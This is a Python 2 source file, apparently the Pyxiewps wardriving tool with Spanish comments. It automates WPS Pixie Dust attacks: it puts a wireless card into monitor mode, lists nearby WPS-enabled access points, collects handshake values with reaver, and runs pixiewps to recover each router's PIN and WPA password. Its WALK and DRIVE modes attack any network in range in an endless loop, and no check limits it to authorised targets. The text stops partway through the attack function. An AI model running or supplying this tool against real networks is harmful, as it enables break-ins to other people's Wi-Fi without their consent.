# -*- coding: utf-8 -*-

from os import kill, system, path, chdir
from signal import alarm, signal, SIGALRM, SIGKILL
import time
import subprocess
from re import sub, compile, search
from sys import argv
import datetime
import urllib

REAVER = 'reaver'
PIXIEWPS = 'pixiewps'
AIRMON = 'airmon-ng'
GIT = 'git'
INFO = '\033[32m[+] \033[0m'   # Verde
ALERTA = '\033[31m[!] \033[0m' # Rojo
INPUT = '\033[34m[>] \033[0m'  # Azul
DATA = '\033[33m[DATA] \033[0m'  #Amarillo
OPCION = '\033[33m[!!!] \033[0m' #Amarillo
SEPARADOR = '*'*70+'\n'
USE_PIXIEWPS = False # Intenta averiguar el pin WPS con pixiewps
AIRODUMP_TIME = 3    # Tiempo para que airodump recopile APs con WPS
RSSI = -100          # Calidad
CHANNEL = ''         # Todos
REAVER_TIME = 6      # Tiempo para que reaver recopile la informacion
CHOICES_YES = ['S', 's', '', 'si', 'Si']
CHOICES_NOPE = ['N', 'n', 'no', 'No']
blacklist = [] # Lista negra de BSSIDs a las que no se ha podido atacar y no tiene sentido volver a hacerlo
PROMPT_APS = False
OUTPUT = False
OUTPUT_FILE = 'data.txt'
PRINT_REAVER = True
PRINT_PIXIE = True
GET_PASSWORD = False
FOREVER = False
OVERRIDE = True
BLACKLIST = True
MAX_APS = 'All'
USE_MODES = False

def banner():
  """
  Imprime el banner en la pantalla
  """
  
  print
  print "\t ____             _                         "
  print "\t|  _ \ _   ___  _(_) _____      ___ __  ___ "
  print "\t| |_) | | | \ \/ / |/ _ \ \ /\ / / '_ \/ __|"
  print "\t|  __/| |_| |>  <| |  __/\ V  V /| |_) \__ \\"
  print "\t|_|    \__, /_/\_\_|\___| \_/\_/ | .__/|___\\"
  print "\t       |___/                     |_|        "
  print
  print "\tPyxiewps v1.1 por jgilhutton"
  print "\tReaver 1.5.2 mod by t6_x <t6_x@hotmail.com> & DataHead & Soxrok2212 & Wiire & kib0rg"
  print "\t Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>"
  print "\tPixiewps  Copyright (c) 2015, wiire <wi7ire@gmail.com>"
  print "\tAircrack www.aircrack-ng.org"
  print
  
def arg_parser():
  """
  Detecta los argumentos y devuelve la ayuda si hay algun problema
  """
 
  global PRINT_PIXIE
  global PRINT_REAVER
  global USE_PIXIEWPS
  global AIRODUMP_TIME
  global REAVER_TIME
  global CHANNEL
  global PROMPT_APS
  global OUTPUT_FILE
  global OUTPUT
  global GET_PASSWORD
  global FOREVER
  global OVERRIDE
  global BLACKLIST
  global RSSI
  global MAX_APS
  global USE_MODES
  H = ['-h','--help']
  flags = ['-p','-P','-f','-q','-F','-A']
  binary_flags = ['-a','-t','-c','-o','-s','-m','-M',
		  '--max-aps','--rssi','--airodump-time','--tiempo','--canal','--output','--modo']
  
  for arg in argv[1:]:
    if arg in H:
      help()
      exit()
    elif argv[argv.index(arg)-1] in binary_flags:
      continue
    elif arg == '-m' or arg == '--modo':
      USE_MODES = True
      modo = argv[argv.index(arg)+1]
      if modo == 'WALK':
	USE_PIXIEWPS = True
	AIRODUMP_TIME = 4
	REAVER_TIME = 8
	GET_PASSWORD = True
	FOREVER = True
	MAX_APS = 2
      elif modo == 'DRIVE':
	USE_PIXIEWPS = True
	REAVER_TIME = 10
	FOREVER = True
	MAX_APS = 1
      elif modo == 'STATIC':
	USE_PIXIEWPS = True
	AIRODUMP_TIME = 5
	REAVER_TIME = 10
	GET_PASSWORD = True
	PROMPT_APS = True
	OVERRIDE = False
      else:
	print ALERTA + "No se reconocio el modo %s." %modo
	print "    Revise la ayuda para ver que modos disponibles hay."
	help()
    elif arg == '-M' or arg == '--max-aps':
      try:
	MAX_APS == int(argv[argv.index(arg)+1])
      except ValueError:
	help()
    elif arg == '-s' or arg == '--rssi':
      try:
	RSSI = int(argv[argv.index(arg)+1])
	if RSSI < -100 or RSSI > 0: help()
      except ValueError:
	help()
    elif arg == '-q' or arg == '--quiet':
      PRINT_PIXIE = False
      PRINT_REAVER = False
    elif arg == '-p' or arg == '--use-pixie':
      USE_PIXIEWPS = True
    elif arg == '-a' or arg == '--airodump-time':
      try:
	AIRODUMP_TIME = int(argv[argv.index(arg)+1])
	if REAVER_TIME <= 0: help()
      except ValueError:
	help()
    elif arg == '-t' or arg == '--tiempo':
      try:
	REAVER_TIME = int(argv[argv.index(arg)+1])
	if REAVER_TIME <= 0: help()
      except ValueError:
	help()
    elif arg == '-c' or arg == '--canal':
      try:
	CHANNEL = int(argv[argv.index(arg)+1])
	if CHANNEL <= 0 or CHANNEL >= 15: help()
      except ValueError:
	help()
    elif arg == '-P' or arg == '--prompt':
      PROMPT_APS = True
    elif arg == '-o' or arg == '--output':
      OUTPUT = True
      try:
	m = argv[argv.index(arg)+1]
	if m not in flags:
	  if file not in binary_flags: OUTPUT_FILE = file
      except IndexError:
	pass
    elif arg == '-f' or arg == '--pass':
      GET_PASSWORD = True
    elif arg == '-F' or arg == '--forever':
      FOREVER = True
    elif arg == '-A' or arg == '--again':
      OVERRIDE = False
      BLACKLIST = False
    else:
      help()
    if CHANNEL != '':
      AIRODUMP_TIME = 1

def help():
  """
  Muestra la ayuda y sale
  """
  
  print
  print '  Ejemplos:'
  print
  print "\tpyxiewps -p -t 6 -c 7 -P -o file.txt -f"
  print "\tpyxiewps --use-pixie -s -70 --tiempo 6 --canal 7 --prompt --output file.txt"
  print "\tpyxiewps -m STATIC"
  print "\tpyxiewps --modo DRIVE"
  print
  print '  Opciones individuales:'
  print
  print '\t-p --use-pixie               Una vez que captura la informacion con Reaver          [False]'
  print '\t                             intenta sacar el pin WPS del router.'
  print '\t-a --airodump-time [tiempo]  Setea el tiempo que va a usar para enumerar los        [3]'
  print '\t                             ap con WPS.'
  print '\t-t --tiempo [tiempo]         Setea el tiempo que va a usar para recolectar la       [6]'
  print '\t                             informacion del AP.'
  print '\t-c --canal [canal]           Proporciona un canal entre 1 y 14 en el que escucha para enumerar'
  print '\t                             los AP con WPS. Si no se usa, se escanean todos los canales.'
  print '\t-P --prompt                  Si se encuentra mas de un AP con WPS, preguntar a cual [False]'
  print '\t                             se quiere atacar. Si el pin WPS ya fue conseguido pregunta para'
  print '\t                             atacar denuevo'
  print '\t-o --output [archivo]        Graba los datos en un archivo de texto.'
  print '\t-f --pass                    Si se tiene exito al averiguar el pin WPS, tambien'
  print '\t                             tratar de averiguar la clave WPA.'
  print '\t-q --quiet                   No muestra la informacion recopilada.'
  print '\t-F --forever                 Corre el programa indefinidamente hasta que se lo interrumpa'
  print '\t-A --again                   Vuelve a atacar APs con pines que ya han sido conseguidos'
  print '\t                             sin preguntar.'
  print '\t-s --signal [-NUMERO]        No se tendran en cuenta redes con una calidad menor a  [-100]'
  print '\t                             NUMERO. Un valor de "-50" obviara las redes con calidad'
  print '\t                             desde -100 a -51 y atacara las que van desde -50 a 0'
  print '\t-M --max-aps [numero]        Establece una cantidad maxima de APs que se van a atacar.'
  print '\t-m --modo [modo]             Establece un modo predeterminado para usar. Cualquier opcion'
  print '\t                             prestablecida podra ser estipulada manualmente con su'
  print '\t                             correspondiente argumento, por ejemplo: "-m DRIVE -t 10"'
  print
  print '  Modos disponibles:'
  print
  print '\tWALK:'
  print '\t\t[-p] [-f] [-a 4] [-t 8] [-F] [-M 2]'
  print '\t\tSe intentara averiguar el pin WPS'
  print '\t\tSe usaran 4 segundos para enumerar APs'
  print '\t\tSe usaran 8 segundos para recuperar la informacion necesaria de cada AP'
  print '\t\tSe intentara averiguar la contrasenia'
  print '\t\tEl programa se ejecutara hasta que el usuario lo interrumpa'
  print '\t\tSe atacaran como maximo 2 objetivos'
  print '\t\tSe saltearan APs cuyo ataque haya sido negativo'
  print '\tDRIVE:'
  print '\t\t[-p] [-t 10] [-F] [-M 1]'
  print '\t\tSe intentara averiguar el pin WPS'
  print '\t\tSe usaran 3 segundos para enumerar APs'
  print '\t\tSe usaran 10 segundos para recuperar la informacion necesaria del AP'
  print '\t\tNo se intentara averiguar la contrasenia'
  print '\t\tEl programa se ejecutara hasta que el usuario lo interrumpa'
  print '\t\tSe atacara solo un objetivo'
  print '\t\tSe saltearan APs cuyo ataque haya sido negativo'
  print '\tSTATIC:'
  print '\t\t[-p] [-f] [-a 5] [-t 10] [-P] [-O]'
  print '\t\tSe intentara averiguar el pin WPS'
  print '\t\tSe usaran 5 segundos para enumerar APs'
  print '\t\tSe usaran 10 segundos para recuperar la informacion necesaria de cada AP'
  print '\t\tSe intentara averiguar la contrasenia'
  print '\t\tEl programa se ejecutara solo una vez'
  print '\t\tSe preguntara por el objetivo a atacar'
  print '\t\tNo se saltearan APs cuyo ataque haya sido negativo'
  exit()
  
class Engine():
  """
  Aca se chequea todo, y se empieza el programa
  """

  def __init__(self):
    self.REAVER = True
    self.PIXIEWPS = True
    self.AIRMON = True
    self.GIT = True
  
  def start(self):
    """
    Crea el colchon para los programas necesarios
    """
    chdir('/root/')
    if not c.check_iface(): # check_iface devuelve True si hay alguna ifaz en mon previamente
      c.set_iface("UP")
    else:
      print INFO + "Se encontro una interfaz en modo monitor: %s" %c.IFACE_MON
      choice = raw_input("%sDesea usar esta interfaz? [S/n] " %INPUT)
      print
      if choice in CHOICES_YES:
	pass
      elif choice in CHOICES_NOPE:
	c.set_iface("DOWN")
	c.set_iface("UP")
    print INFO + "Empezando el ataque..."
    while True:
      attack = Attack()
      attack.get_wps_aps()
      if not FOREVER:
	engine.exit_limpio()

  def parse_reaver(self, output, pin_encontrado = False):
    """
    Analiza el output del reaver
    Saca el pkr, pke, hash1 y 2, enonce, rnonce, authkey, fabricante y modelo
    y los devuelve
    """

    if pin_encontrado:
      password = ''
      for linea in output:
	if '[+] WPA PSK: ' in linea:
	  password = sub('\[\+\] WPA PSK: ','',linea)
	  return password
      if password == '':
	return 'no password'

    E_NONCE = ''
    R_NONCE = ''
    PKR = ''
    PKE = ''
    HASH1 = ''
    HASH2 = ''
    AUTHKEY = ''
    MANUFACTURER = ''
    MODEL = ''
    NUMBER = ''
    uberlista = []
    lista_final = []
    is_complete = False
    has_something = False
    
    if output == '':
      return 'cacota'
      
    for linea in output:
      if 'E-Nonce' in linea:
	has_something = True
      elif 'E-Hash2' in linea:
	lista_final = output[0:output.index(linea)+1] # Trunca el output hasta el hash2
	is_complete = True
	break
      elif 'Detected AP rate limiting' in linea:
	return 'ap rate limited'
    if has_something and not is_complete:
      return 'more time please'
    elif has_something == False:
      return 'noutput'
    for linea in lista_final:
      if 'E-Nonce' in linea:
	E_NONCE = sub('\[P\] E-Nonce: ','',linea)
      elif 'R-Nonce' in linea:
	R_NONCE = sub('\[P\] R-Nonce: ','',linea)
      elif 'PKR' in linea:
	PKR = sub('\[P\] PKR: ','',linea)
      elif 'PKE' in linea:
	PKE = sub('\[P\] PKE: ','',linea)
      elif 'E-Hash1' in linea:
	HASH1 = sub('\[P\] E-Hash1: ','',linea)
      elif 'E-Hash2' in linea:
	HASH2 = sub('\[P\] E-Hash2: ','',linea)
      elif 'AuthKey' in linea:
	AUTHKEY = sub('\[P\] AuthKey: ','',linea)
      elif 'Manufacturer' in linea:
	MANUFACTURER = sub('\[P\] WPS Manufacturer: ','',linea)
      elif 'Model Name' in linea:
	MODEL = sub('\[P\] WPS Model Name: ','',linea)
      elif 'Model Number' in linea:
	NUMBER = sub('\[P\] WPS Model Number: ','',linea)
      elif '[+] Associated with ' in linea:
	ESSID = sub('\(ESSID\: ','|',linea)
	ESSID = ESSID.split('|')[-1][:-2]
      elif '[+] Waiting for beacon from ' in linea:
	BSSID = sub('\[\+\] Waiting for beacon from ','',linea)

    uberlista = [PKE.strip(),PKR.strip(),HASH1.strip(),HASH2.strip(),AUTHKEY.strip(),
    MANUFACTURER.strip(),MODEL.strip(),NUMBER.strip(),E_NONCE.strip(),R_NONCE.strip(),
    ESSID.strip(),BSSID.strip()]
    return uberlista
  
  def parse_airodump(self, input):
    """
    Analiza el output de airodump
    y devueve ESSIDs, WPSstatus, canal, bssid y senial
    """

    plist = []
    input.reverse() # MUY IMPORTANTE
    inds = [47,73,86] # indices para CANAL, WPS, ESSID
    if CHANNEL != '': inds = [i+4 for i in inds]
    for linea in input:                              # Elimina los clientes que aparecen en el dump
      if 'Probe' in linea:                           # del airodump para que no interfieran en el parser
	input = input[(input.index(linea)+1):]       # 'Probe' aparece en la lista de clientes nada mas
	break                                        #
    for i in input:
      if "][ Elapsed:" not in i and ":" in i and "<length:" not in i:
	#print i
	i = i.lstrip().strip()
	snowden = i[inds[1]:]
	try:
	  wps = snowden[0:snowden.index('  ')].strip()
	  essid = snowden[(snowden.index('  ')+2):].lstrip()
	except IndexError: # Por el '  '
	  continue
	canal = i[inds[0]:inds[0]+2].lstrip()
	bssid = i[0:17]
	rssi = i[19:22]
	try:
	  if bssid not in blacklist and wps != '' and '0.0' not in wps and int(i[1]) >= RSSI:
	    a = '%s|%s|%s|%s|%s|%s' %(bssid,canal.zfill(2),rssi,wps,wps,essid)
	    plist.append(a)
	except:
	  return plist
      elif "][ Elapsed:" in i:
	break
    plist.sort(key=lambda x: int(x[21:24]), reverse = True) # Ordena la lista de mayor a menor RSSI.
    if MAX_APS != 'All':
      try:
	return plist[0:MAX_APS]
      except IndexError:
	return plist
    if MAX_APS == 'All': # Con un else se hace pero lo hago por el bien de la lectura
      return plist

  def check(self, check_again = False):
    """
    Chequea dependencias, el usuario que ejecuta el programa y otras weas
    """
    
    if c.get_uid() != '0':
      print ALERTA + 'Necesita ejecutar este programa como superusuario'
      exit()

    size = c.screen_size()
    if size < 110:
      print
      print ALERTA + "El tamaño de la consola en la que se esta ejecutando"
      print "    el programa debe ser mayor. Por favor agrande la consola y"
      print "    vuelva a ejecutar el programa."
      exit()

    ### Programas
    if c.program_exists(REAVER):
      version = c.check_reaver_version()
      if version == '1.5.2':
	self.REAVER = True
      else:
	print ALERTA + "La version de reaver instalada no es la correcta"
	self.REAVER = False
    elif not check_again:
      print ALERTA + 'reaver no esta instalado'
      self.REAVER = False
    if c.program_exists(PIXIEWPS):
      self.PIXIEWPS = True
    elif not check_again:
      print ALERTA + 'pixiewps no esta instalado'
      self.PIXIEWPS = False
    if c.program_exists(AIRMON):
      self.AIRMON = True
    elif not check_again:
      print ALERTA + 'airmon-ng no esta instalado'
      self.AIRMON = False
    if c.program_exists(GIT):
      self.GIT = True
    elif not check_again:
      self.GIT = False
    if self.REAVER and self.AIRMON and self.PIXIEWPS and check_again:
      print INFO + "Todos los programas se instalaron correctamente."
      raw_input("%sPresione enter para continuar" %INPUT)
      print INFO + "Empezando el ataque..."
    elif check_again:
      print
      print ALERTA + "No se pudieron instalar algunos prorgamas."
      print "    Revise manualmente las dependecias necesitadas"
      print "    y luego de instalarlas, ejecute otra vez el programa."
      print
      exit()
    if not (self.REAVER and self.AIRMON and self.PIXIEWPS):
      print ALERTA + "Necesita tener todos los programas necesarios."
      print INPUT + "Las dependencias son:"
      print "\tbuild-essential"
      print "\tlibpcap-dev"
      print "\tsqlite3"
      print "\tlibsqlite3-dev"
      print "\taircrack-ng"
      print "\tlibssl-dev"
      choice = raw_input("%sDesea que instalarlas ahora [S/n]?" %INPUT)
      if choice in CHOICES_YES:
	c.get_binarios()
      else:
	exit()
    
    version = subprocess.Popen('airodump-ng --help | grep wps', shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
    version1 = version.communicate()[0]
    if '--wps' not in version1:
      print
      print ALERTA + "La version de Aircrack es incorrecta."
      print "    Por favor actualice los repositorios e instale"
      print "    la ultima version de Aircrack."
      print
      self.exit_limpio()
      
    ###Todo en orden...
    engine.start()

  def run(self, cmd, shell = False, kill_tree = True, timeout = -1, airodump = False):
    """
    Ejecuta un comando durante un tiempo determinado que,
    transcurrido, es terminado. Devuelve el stdout del proc.
    output es una lista con las lineas sin strip().
    """

    class Alarm(Exception):
      pass
    def alarm_handler(signum, frame):
      raise Alarm
    output = []
    if timeout != -1:
      signal(SIGALRM, alarm_handler) # Empieza a correr el tiempo
      alarm(timeout)                 # Si se acaba levanta una alarma
    if airodump:
      proc = subprocess.Popen(cmd, shell = shell, stderr = subprocess.PIPE)
    else:
      proc = subprocess.Popen(cmd, shell = shell, stdout = subprocess.PIPE)
    try:
      if airodump:
	for line in iter(proc.stderr.readline, ''):
	  output.append(line)
	if timeout != -1:
	  alarm(0)
      else:
	for line in iter(proc.stdout.readline, ''):
	  output.append(line)
	if timeout != -1:
	  alarm(0)
    except Alarm:         # El tiempo acaba y se produce una alarma
      pids = [proc.pid]   # Se matan los procesos relacionados con proc.
      if kill_tree:
	pids.extend(self.get_process_children(proc.pid))
      for pid in pids:   # Es posible que el proceso haya muerto antes de esto
	try:             # por eso se maneja el error con el except OSError
	  kill(pid, SIGKILL)
	except OSError:
	  pass
      return output
    return output

  def get_process_children(self, pid):
    """
    Devuelve los pids del programa que se haya abierto para
    matar todo el arbol de procesos child
    """
    
    proc = subprocess.Popen('ps --no-headers -o pid --ppid %d' % pid, shell = True, stdout = subprocess.PIPE)
    stdout = proc.communicate()[0]
    return [int(p) for p in stdout.split()]
    
  def exit_limpio(self):
    """
    limpia las cosas antes de terminar el programa
    """
    if path.isfile('/root/pixiewps/Makefile') or path.isfile('/root/reaver-wps-fork-t6x/src/Makefile'):
      print OPCION + "Los archivos para instalar pixiewps y reaver ya no son necesarios"
      print "      y se encuentran en la carpeta home del usuario root"
      choice = raw_input("%sDesea borrarlos? [S/n]" %INPUT)
      if choice in CHOICES_YES:
	system('cd /root && rm -r pixiewps/ && rm -r reaver-wps-fork-t6x/')
    if c.IS_MON:
      c.set_iface("DOWN")
      system('pkill airodump')
      system('rm -f /usr/local/etc/reaver/*.wpc')
    exit()

class Config():
  """
  Funciones de configuracion de interfaces.
  """
  
  IFACE_MON = 'caca'
  IFACE = 'caca'
  IS_MON = False
  
  def screen_size(self):
    """
    Devuelve el ancho de la consola en que se ejecuta el programa
    """
    
    return int(subprocess.check_output(['stty','size']).split()[1])

  def program_exists(self, programa):
    """
    Chequea si existe el programa que se le
    pasa en el argumento
    """

    cmd = "which " + programa
    output = subprocess.Popen(cmd, shell=True, stdout = subprocess.PIPE)
    output = output.communicate()[0]

    if output != "":
      return True    # Existe
    else:
      return False   # No existe

  def get_uid(self):
    """
    Devuelve el usuario que ejecuta el script
    """
    
    uid = subprocess.check_output(['id','-u']).strip()
    return uid
  
  
  def internet_on(self):
    """
    Revisa la conexion
    """
    
    try:
      stri = "https://duckduckgo.com" # Chequea si hay conexion con duckduckgo
      data = urllib.urlopen(stri)
      return True
    except:
      return False
      
  def check_iface(self):
    """
    Se fija si hay alguna interfaz en modo monitor
    para no crear otra interfaz al pedo
    """
    
    proc = subprocess.Popen('iwconfig',shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE).communicate()[0].strip().split('\n')
    mon = ''
    for linea in proc:
      if 'Monitor' in linea:
	mon = linea[0:10].strip()
    if mon != '':
      self.IFACE_MON, self.IFACE = mon,mon
      self.IS_MON = True
      return True
    else:
      return False
  
  def get_iface(self):
    """
    Si no hay interfaces en modo monitor, devuelve las wlans.
    Si hay mas de una, pregunta cual se quiere usar.
    Si la interfaz ya esta en modo monitor, devuelve el nombre.
    """

    if self.IS_MON: # Si la interfaz esta en modo monitor devuelve el nombre de la ifaz
      proc = subprocess.Popen('iwconfig',shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE).communicate()[0].strip().split('\n')
      for linea in proc:
	if 'Monitor' in linea:
	  mon = linea[0:10].strip()
	  self.IFACE_MON = mon
	  return mon
    else:
      proc = subprocess.Popen('iwconfig',shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE).communicate()[0].strip().split('\n')
      ifaces = []
      for linea in proc:
	if 'IEEE' in linea:
	  ifaces.append(linea[0:10].strip())
      if len(ifaces) == 1 and ifaces[0] == '':
	print ALERTA + "No hay interfaces wireless!"
	print "    Asegurese de que posee un dispositivo wireless."
	print "    Si esta corriendo en una maquina virtual debe"
	print "    adquirir un modulo WiFi USB."
	exit()
      elif len(ifaces) > 1:
	print INPUT + "Seleccione interfaz: "
	for i in ifaces:
	  print str(ifaces.index(i)) + " >> " + i
	while True:    #Evita que le mandes fruta
	  try:
	    choice = int(raw_input(INPUT))
	    self.IFACE = ifaces[choice]
	    return ifaces[choice]
	    break
	  except (IndexError, ValueError):
	    print ALERTA + "Inserte un numero entre 0 y %s" %(len(ifaces)-1) #Maneja el error
	  except KeyboardInterrupt:
	    print 
	    print ALERTA + "Programa interrumpido"
	    print 
	    engine.exit_limpio()
      else:
	self.IFACE = ifaces[0]
	return ifaces[0]
  
  def set_iface(self, status):
    """
    Maneja la interfaz inalambrica. La pone en modo monitor
    y la repone al modo normal.
    La variable "status" esta solo para mejorar la lectura
    Se basa en el booleano "self.IS_MON"
    """   
    
    if self.IS_MON:
      print INFO + 'Terminando el modo monitor en la interfaz %s...' %self.get_iface()
      system('ifconfig %s down' %(self.IFACE_MON))
      system('iwconfig %s mode Managed' %(self.IFACE_MON)) 
      system('ifconfig %s up' %(self.IFACE_MON))
      self.IS_MON = False
      print INFO + 'Listo'
    else:
      print INFO + 'Configurando la interfaz %s en modo monitor...' %(self.get_iface())
      system('ifconfig %s down' %(self.IFACE))
      system('iwconfig %s mode monitor' %(self.IFACE)) 
      system('ifconfig %s up' %(self.IFACE))
      self.IFACE_MON = self.IFACE
      self.IS_MON = True
      print INFO + "%s corriendo en modo monitor" %self.IFACE_MON
      print
      
  def data_file(self, data):
    """
    Guarda la informacion en un archivo
    """
    system('echo INFORMACION >> %s' %OUTPUT_FILE)
    with open(OUTPUT_FILE, 'a+') as f:
      date = str(datetime.datetime.now())
      f.write(date+'\n')
      f.writelines(data)
    print INFO + "Se guardo la informacion en el archivo %s" %OUTPUT_FILE
    
  def get_binarios(self):
    """
    Instala reaver, pixiewps y otras dependencias
    """
    
    if not self.internet_on():
      print
      print ALERTA + "No esta conectado a internet"
      print "    Conectese a una red para poder instalar"
      print "    los programas necesarios."
      print
      engine.exit_limpio()
    git = 'apt-get -y install git'
    reaver_dep = 'apt-get -y install build-essential libpcap-dev sqlite3 libsqlite3-dev aircrack-ng'
    pixie_dep = 'sudo apt-get -y install libssl-dev'
    reaver_apt = 'apt-get -y install reaver'
    reaver = 'git clone https://github.com/t6x/reaver-wps-fork-t6x.git'
    pixiewps = 'git clone https://github.com/wiire/pixiewps.git'
    aircrack = 'apt-get -y install aircrack-ng'
    if not engine.GIT:
      print INFO + "Instalando git"
      proc4 = system(git)
    if not engine.AIRMON:
      print INFO + "Instalando aircrack..."
      proc5 = system(aircrack)
    if not engine.PIXIEWPS:
      print INFO + "Instalando dependencias de pixiewps..."
      proc2 = system(pixie_dep)
      print INFO + "Descargando pixiewps..."
      proc3 = system(pixiewps)    
    if not engine.REAVER:
      print INFO + "Instalando las dependencias de reaver..."
      proc = system(reaver_dep)
      print INFO + "Descargando reaver..."
      if 'kali' in subprocess.check_output('uname -a', shell = True):
	proc1 = system(reaver_apt)
      else:
	proc1 = system(reaver)
    if path.isdir('pixiewps') and not engine.PIXIEWPS:
      print INFO + "Instalando pixiewps..."
      system('cd pixiewps/src && make && make install')
      print INFO + "Listo"
    if path.isdir('reaver-wps-fork-t6x') and not engine.REAVER:
      print INFO + "Instalando reaver..."
      system('cd reaver-wps-fork-t6x* && cd src && ./configure && make && make install')
      print INFO + "Listo"
    engine.check(check_again = True)

  def check_reaver_version(self):
    """
    Devuelve la version de reaver que se tiene instalada
    """
    
    output = subprocess.Popen('reaver -h', shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
    output = output.communicate()
    if 'Reaver v1.5.2 WiFi Protected Setup Attack Tool' in output[0] and 'mod by t6_x' in output[0]:
      return '1.5.2'
    elif output[0] != '':
      return output[0][9:12]
    elif 'Reaver v1.5.2 WiFi Protected Setup Attack Tool' in output[1] and 'mod by t6_x' in output[1]:
      return '1.5.2'
    elif output[1] != '':
      return output[1][9:12]

class Attack():
  """
  Funciones de ataque y recopilacion de informacion del AP
  """
  
  def get_wps_aps(self):
    """
    Enumera los APs con WPS
    Crea las instancias de Target.
    Pasa a get_reaver_info
    """

    print INFO + "Enumerando APs con WPS activado..."
    cmd = 'airodump-ng -c 1-11 --wps %s' %(c.IFACE_MON)
    if CHANNEL != '':
      cmd = 'airodump-ng -c %d --wps %s' %(CHANNEL, c.IFACE_MON)
    output = engine.run(cmd, shell = True, timeout = AIRODUMP_TIME, airodump = True)
    lista_aps = engine.parse_airodump(output)
    ultimo = len(lista_aps)-1
    
    if lista_aps == []:
      print
      print ALERTA + "No se encontraron APs con WPS activado."
      print
      if not FOREVER:
	engine.exit_limpio()
    else:
      for_fill = lista_aps                                              #\
      essids = []                                                       #|
      for line in for_fill:                                             #|- Para que quede mas linda la lista
	line = line.split('|')                                          #|- de los APs.
	essids.append(line[5])                                          #|
      fill = len(max(essids))                                           #/
      print INFO + "Se encontraron los siguientes APs con WPS activado:"
      for linea in lista_aps:
	linea = linea.split('|')
	fill_line = fill - len(linea[5])
	print '\t' + INPUT + str(linea[5]) + ' '*fill_line + ' || ' + linea[0] + ' || Canal: ' + linea[1] + ' || RSSI: ' + linea[2] + ' || WPS: ' + linea[4]
      while True:
	try:
	  if len(lista_aps) != 1 and PROMPT_APS: 
	    choice = raw_input("%sProporcione el inice del AP o presione ENTER para elegir todos: " %INPUT)
	    if choice == '':
	      break
	    else:
	      choice = int(choice)
	      provisoria = []
	      provisoria.append(lista_aps[choice])
	      lista_aps = provisoria
	      break
	  else:
	    break
	except KeyboardInterrupt:
	  print
	  engine.exit_limpio()
	  break
	except (ValueError, IndexError):
	  print ALERTA + "Proporcione un numero entre 0 y %d" %ultimo
      if path.isfile('pyxiewpsdata.txt'):
	coincidencias = []
	pin_correspondiente = []
	with open('pyxiewpsdata.txt') as f:  # Revisa si el AP ya ha sido atacado con exito
	  ya_sacados = f.readlines()
	if len(ya_sacados) > 1:
	  ya_sacados.reverse()  # Se revierte para tomar el pin mas actualizado ante un posible cambio del pin WPS.
	  for target in lista_aps:
	    for line in ya_sacados[1:]:
	      if target.split('|')[5] == line.strip():
		coincidencias.append(target)
		pin_correspondiente.append(ya_sacados[ya_sacados.index(line)-1].strip())
	  for i in set(coincidencias):
	    print OPCION + "El pin de %s ya ha sido averiguado: " %i.split('|')[5]
	    print '\t'+ INPUT + pin_correspondiente[coincidencias.index(i)]
	    if not OVERRIDE:
	      print INFO + "Se atacara otra vez como se pidio."
	      print
	    else:
	      print INFO + "Se saltea para siempre."
	      lista_aps.remove(i) # Se elimina de la lista de objetivos
	      blacklist.append(i[:17])
	      print
      for linea in lista_aps: # for-loop principal del programa hasta que pruebe el multithread
	linea = linea.split('|')
	self.get_reaver_info(linea[0],linea[1],linea[5])
	print SEPARADOR
      if not FOREVER:
	engine.exit_limpio()
  
  def get_reaver_info(self, bssid, canal, essid):
    """
    Recopila la informacion vital para
    el ataque PixieDust. PKR, PKE, HASH1, HASH2, AUTHKEY
    Actua dentro del for-loop de get_wps_aps
    """
    
    print INFO + "Recopilando informacion de %s con reaver..." %essid
    output = engine.run(cmd=['reaver','-i',c.IFACE_MON,'-b',bssid,'-vvv','-P','-l', '1','-c',canal], timeout = REAVER_TIME)
    data = engine.parse_reaver(output)
    if data == 'noutput':
      print
      print ALERTA + "No se pudo obtener la informacion necesaria del AP"
      print ALERTA + "Pruebe con un tiempo mas alto como argumento -t"
      print "    y si aun no se puede obtener la informacion"
      print "    mejore la recepcion de su interfaz"
      print
    elif data == 'more time please':
      print
      print ALERTA + "El programa obtuvo alguna informacion pero no alcanzo"
      print "    a recuperar todo lo necesario. Aumente el tiempo para buscar"
      print "    la informacion del AP con el argumento -t. Por default -t es 6 segundos"
      print
    elif data == 'ap rate limited':
      print
      print ALERTA + "Al AP no le gustan los ataques de WPS"
      print "    por lo tanto no se pudo recopilar la informacion"
      if BLACKLIST:
	blacklist.append(bssid)
	print INFO + "%s no se volvera a atacar." %essid
      else:
	print "    pero %s se volvera a atacar como se pidio." %essid
      print
    elif data == 'cacota':
      print
      print "Seleccione una opcion de sesion para reaver"
      if not FOREVER:
	engine.exit_limpio()
    else:
      print INFO + "Exito. Se encontro la informacion necesaria."
      for_file = ['ESSID: ' + data[10] + '\n','MAC: ' + data[11] + '\n','PKE: ' + data[0] + '\n',
      'PKR: ' + data[1] + '\n','HASH1: ' + data[2] + '\n','HASH2: ' + data[3] + '\n',
      'E-NONCE: ' + data[8] + '\n','R-NONCE: ' + data[9] + '\n','AUTHKEY: ' + data[4] + '\n',
      'FABRICANTE: ' + data[5] + '\n','MODELO: ' + data[6] + '\n','NUMERO DE MODELO: ' + data[7] + '\n']
      if PRINT_REAVER:
	print
	for linea in for_file:
	  print DATA + linea.strip()
	print
      if OUTPUT and not USE_PIXIEWPS:
	for_file.append('-'*40+'\n')
	c.data_file(for_file)
      if USE_PIXIEWPS:
	self.pixie_attack(data,for_file,canal)

  def pixie_attack(self,data,for_file,canal):
    """
    intenta recuperar el pin WPS usando el ataque PixieDust
    """
    
    ESSID = data[10]
    BSSID = data[11]
    PKE = data[0]
    PKR = data[1]
    HASH1 = data[2]
    HASH2 = data[3]
    AUTHKEY = data[4]
    E_NONCE = data[8]
    R_NONCE = data[9]
    
    cmd = ['pixiewps','-e',PKE,'-r',PKR,'-s',HASH1,'-z',HASH2,'-a',AUTHKEY,'-n',E_NONCE]
    cmd1 = ['pixiewps','-e',PKE,'-s',HASH1,'-z',HASH2,'-a',AUTHKEY,'-n',E_NONCE,'-S']
    cmd2 = ['pixiewps','-e',PKE,'-s',HASH1,'-z',HASH2,'-n',E_NONCE,'-m',R_NONCE,'-b',BSSID,'-S']
    pin = ''
    cmd_list = [cmd, cmd1, cmd2]
    output = []
    for command in cmd_list:
      try:
